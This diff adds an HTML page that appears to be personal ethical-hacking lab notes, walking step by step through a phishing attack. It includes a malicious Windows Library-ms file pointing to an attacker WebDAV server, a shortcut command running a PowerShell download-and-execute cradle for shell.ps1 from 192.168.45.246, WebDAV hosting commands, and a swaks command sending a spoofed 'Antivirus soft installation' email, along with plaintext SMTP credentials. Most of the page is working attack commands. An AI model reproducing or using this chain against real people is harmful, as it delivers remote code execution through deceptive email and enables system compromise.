@@ -1,0 +1,151 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>Preparation</h1>
+    <ul>
+        <li><code>config.Library-ms</code></li>
+        <li><code>body.txt</code></li>
+        <li>Directory to share malicious file.</li>
+        <li>Malicious file to execute itself and .lnk file navigating to malicious file.</li>
+    </ul>
+
+    <h2 class="blue">1. config.Library-ms</h2>
+    <div class="code-box"><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;<u>url&gt;http://192.168.45.246&lt;/url</u>&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+&lt;/libraryDescription&gt;</code></pre></div></body>
+
+<h2 class="blue">2. body.txt</h2>
+<p class="common">Whatever for lab...(since the target is bot.)</p>
+
+<h2 class="blue">3. folder</h2>
+<div class="code-box"><pre><code>mkdir WHATEVER</code></pre></div>
+
+<h2 class="blue">.lnk file</h2>
+<p class="common">Create actual shortcut.</p>
+<div class="code-box"><pre><code>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString
+('http://192.168.45.246/shell.ps1')"</code></pre></div>
+
+<h2 class="blue">shell.ps1</h2>
+<p class="common">copy your shell.ps1 under the folder you created.</p>
+
+
+<h1>Serve the malicious files</h1>
+<h2 class="blue">Start hosting</h2>
+<div class="code-box"><pre><code>wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./fishing</code></pre></div>
+
+<h2 class="blue">Send Fishing mail</h2>
+<div class="code-box"><pre><code>sudo swaks -t TAEGET@MAIL --from SENDER@MAIL --attach @config.Library-ms --server MAIL_SERVER_IP --body @body.txt 
+--header "Subject: Antivirus soft installation" --suppress-data -ap
+Username: maildmz@relia.com
+Password: DPuBT9tGCBrTbR</code></pre></div>
+  <h2>Option Breakdown</h2>
+  <ul>
+
+    <li>
+      <code>swaks</code>
+      <ul>
+        <li>SMTP testing tool: <strong>Sw</strong>iss <strong>A</strong>rmy <strong>K</strong>nife for <strong>S</strong>MTP.</li>
+        <li>Used to send test emails, check authentication, attachments, headers, etc.</li>
+      </ul>
+    </li>
+
+    <li>
+      <code>-t jim@relia.com</code>
+      <ul>
+        <li>Sets the <strong>recipient (To)</strong> address.</li>
+        <li>Here, the email will be sent to <code>jim@relia.com</code>.</li>
+      </ul>
+    </li>
+
+    <li>
+      <code>--from mark@relia.com</code>
+      <ul>
+        <li>Sets the <strong>sender (From)</strong> address used in the email header.</li>
+        <li>The email will appear to come from <code>mark@relia.com</code> (spoofed sender).</li>
+      </ul>
+    </li>
+
+    <li>
+      <code>--attach @config.Library-ms</code>
+      <ul>
+        <li>Adds an attachment to the email.</li>
+        <li><code>@filename</code> means “attach the contents of this file”.</li>
+        <li>Here, <code>config.Library-ms</code> is attached (likely for DLL/Library side-loading scenarios).</li>
+      </ul>
+    </li>
+
+    <li>
+      <code>--server 192.168.212.189</code>
+      <ul>
+        <li>Specifies the <strong>SMTP server</strong> to connect to.</li>
+        <li>In this case, swaks will connect directly to <code>192.168.212.189</code> on the SMTP port (usually 25/587).</li>
+      </ul>
+    </li>
+
+    <li>
+      <code>--body @body.txt</code>
+      <ul>
+        <li>Defines the email body (message content).</li>
+        <li><code>@body.txt</code> means “use the contents of <code>body.txt</code> as the email body”.</li>
+        <li>Useful for pre-writing phishing text or instructions in a separate file.</li>
+      </ul>
+    </li>
+
+    <li>
+      <code>--header "Subject: Antivirus soft installation"</code>
+      <ul>
+        <li>Adds a custom header to the email.</li>
+        <li>Here it sets the <strong>Subject</strong> header to <code>Antivirus soft installation</code>.</li>
+        <li>This subject is crafted to look like an IT/security-related installation request.</li>
+      </ul>
+    </li>
+
+    <li>
+      <code>--suppress-data</code>
+      <ul>
+        <li>Tells swaks not to print the full message data (body, attachments) in the output.</li>
+        <li>Makes the terminal output cleaner by showing mostly the SMTP dialogue and status.</li>
+      </ul>
+    </li>
+
+    <li>
+      <code>-ap</code>
+      <ul>
+        <li>Enables SMTP authentication and prompts for credentials.</li>
+        <li>When you run the command, you see:
+          <pre>
+Username: maildmz@relia.com
+Password: DPuBT9tGCBrTbR</pre>
+        </li>
+        <li>These credentials are used to authenticate against the SMTP server before sending the email.</li>
+      </ul>
+    </li>
+  </ul>
+
+
+
+</html>
